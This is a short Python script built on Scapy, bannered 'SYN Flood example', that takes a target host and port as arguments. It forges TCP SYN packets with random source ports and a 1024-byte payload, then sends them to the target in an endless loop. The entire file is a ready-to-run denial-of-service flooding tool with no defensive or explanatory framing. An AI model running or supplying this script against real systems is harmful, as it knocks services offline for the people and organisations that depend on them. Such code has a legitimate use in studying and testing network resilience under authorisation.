from scapy.all import *
from scapy.layers.inet import *

import argparse

print()
print("        _____  ______ ___    _____ _____")
print("       / ___/ / ____//   |  / ___// ___/")
print("       \__ \ / /    / /| |  \__ \ \__ \ ")
print("      ___/ // /___ / ___ | ___/ /___/ / ")
print("     /____/ \____//_/  |_|/____//____/  ")
print("                                        ")
print("             SYN Flood example          ")
print()

parser = argparse.ArgumentParser()
parser.add_argument('--target', type=str, required=True)
parser.add_argument('--port', type=int, required=True)
args = parser.parse_args()

target = args.target
port = args.port

print(" target: " + target)
print(" port: " + str(port))
print()

print("     packet forgery")
ip = IP(dst=target)
tcp = TCP(sport=RandShort(), dport=port, flags="S")
payload = Raw(b"X"*1024)

pkt = ip / tcp / payload

print("     sending packets")
send(pkt, loop=1, verbose=0)